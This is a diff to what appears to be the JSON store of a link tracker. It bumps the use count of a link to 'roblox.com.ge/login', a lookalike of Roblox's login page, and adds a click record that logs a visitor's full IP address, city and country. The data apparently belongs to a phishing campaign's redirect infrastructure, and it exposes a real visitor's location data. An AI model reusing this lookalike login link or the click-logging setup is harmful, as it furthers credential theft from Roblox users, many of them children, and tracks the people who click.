@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1521,
+    "useCount": 1522,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12336,6 +12336,14 @@
         "city": "Sydney",
         "flag": "🇦🇺",
         "countryCode": "AU"
+      },
+      {
+        "timestamp": 1777447420186,
+        "ip": "223.205.58.126",
+        "country": "Thailand",
+        "city": "Hat Yai",
+        "flag": "🇹🇭",
+        "countryCode": "TH"
       }
     ]
   },
